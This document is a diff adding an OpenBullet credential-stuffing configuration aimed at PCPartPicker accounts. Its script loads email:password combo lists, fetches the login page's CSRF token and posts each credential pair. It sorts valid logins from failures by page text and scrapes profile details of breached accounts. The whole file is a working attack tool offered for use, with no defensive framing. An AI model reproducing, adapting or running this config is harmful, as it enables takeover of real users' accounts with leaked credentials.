@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea0de401f6483bd78a57d3072bfb1a23-LoliKEY",
+  "Name": "PCpartpicker",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-20T10:21:51.9531222+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://pcpartpicker.com/accounts/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://pcpartpicker.com" 
+  HEADER "referer: https://pcpartpicker.com/accounts/login/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "'csrfmiddlewaretoken' value='" "'" -> VAR "CSRF" 
+
+REQUEST POST "https://pcpartpicker.com/accounts/login/" 
+  CONTENT "csrfmiddlewaretoken=<CSRF>&next=&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://pcpartpicker.com" 
+  HEADER "referer: https://pcpartpicker.com/accounts/login/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "authority: pcpartpicker.com" 
+  HEADER "method: POST" 
+  HEADER "path: /accounts/login/" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+
+REQUEST GET "https://pcpartpicker.com/user/<USER>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "user/<USER>/comments/\">" "</a>" -> CAP "Comments" 
+
+PARSE "<SOURCE>" LR "user/<USER>/topics/\">" "</a>" -> CAP "Topics" 
+
+PARSE "<SOURCE>" LR "user/<USER>/guides/\">" "</a>" -> CAP "Guides" 
+
+PARSE "<SOURCE>" LR "user/<USER>/builds/\">" "</a>" -> CAP "Builds" 
+
